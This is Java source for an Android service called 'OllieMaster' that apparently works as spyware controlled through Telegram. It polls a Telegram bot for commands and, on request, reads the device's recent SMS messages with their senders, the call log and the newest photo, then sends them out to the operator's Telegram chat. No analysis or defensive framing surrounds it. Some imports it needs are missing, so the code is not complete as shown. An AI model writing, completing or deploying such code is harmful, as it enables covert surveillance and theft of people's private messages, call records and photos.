package com.ollie.master;
import android.app.*; import android.content.*; import android.os.IBinder; import android.database.Cursor; import android.provider.*; import android.net.Uri; import java.util.*;
public class BotService extends Service {
    private Thread worker;
    private int offset = 0;
    @Override
    public int onStartCommand(Intent i, int f, int s) {
        NotificationChannel channel = new NotificationChannel("bot", "Bot Service", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification n = new Notification.Builder(this, "bot").setContentTitle("OllieMaster").setSmallIcon(android.R.drawable.ic_menu_info_details).build();
        startForeground(1, n);

        if (worker == null || !worker.isAlive()) {
            worker = new Thread(() -> {
                Tg.send("👑 OllieMaster Started!\n\nCommands:\n/sms\n/calls\n/photo\n/ping");
                while (true) {
                    try {
                        URL url = new URL("https://api.telegram.org/bot" + Tg.BOT + "/getUpdates?offset=" + offset + "&timeout=10");
                        HttpURLConnection c = (HttpURLConnection) url.openConnection();
                        BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                        StringBuilder sb = new StringBuilder(); String l;
                        while ((l = br.readLine()) != null) sb.append(l);
                        br.close(); c.disconnect();
                        
                        String response = sb.toString();
                        if (response.contains("\"update_id\":")) {
                            int start = response.lastIndexOf("\"update_id\":") + 12;
                            int end = response.indexOf(",", start);
                            if (end == -1) end = response.indexOf("}", start);
                            try { offset = Integer.parseInt(response.substring(start, end).trim()) + 1; } catch (Exception e) {}

                            if (response.contains("/sms")) sendSms();
                            else if (response.contains("/calls")) sendCalls();
                            else if (response.contains("/photo")) sendPhoto();
                            else if (response.contains("/ping")) Tg.send("🏓 pong");
                        }
                        Thread.sleep(3000);
                    } catch (Exception e) { try { Thread.sleep(5000); } catch (Exception ex) {} }
                }
            });
            worker.start();
        }
        return START_STICKY;
    }

    private void sendSms() {
        StringBuilder sb = new StringBuilder("📩 آخر 15 رسالة:\n\n");
        Cursor c = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC LIMIT 15");
        if (c != null) {
            while (c.moveToNext()) {
                sb.append("👤 ").append(c.getString(c.getColumnIndexOrThrow("address"))).append("\n");
                sb.append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n\n");
            }
            c.close();
        }
        Tg.send(sb.toString());
    }

    private void sendCalls() {
        StringBuilder sb = new StringBuilder("📞 آخر 15 مكالمة:\n\n");
        Cursor c = getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 15");
        if (c != null) {
            while (c.moveToNext()) {
                sb.append("👤 ").append(c.getString(c.getColumnIndexOrThrow("number")));
                sb.append(" (⏱ ").append(c.getString(c.getColumnIndexOrThrow("duration"))).append("s)\n");
            }
            c.close();
        }
        Tg.send(sb.toString());
    }

    private void sendPhoto() {
        Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
            new String[]{MediaStore.Images.Media.DATA}, null, null, "date_added DESC LIMIT 1");
        if (c != null) {
            if (c.moveToFirst()) {
                String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                Tg.sendPhoto(path, "📸 صورة جديدة");
            }
            c.close();
        }
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
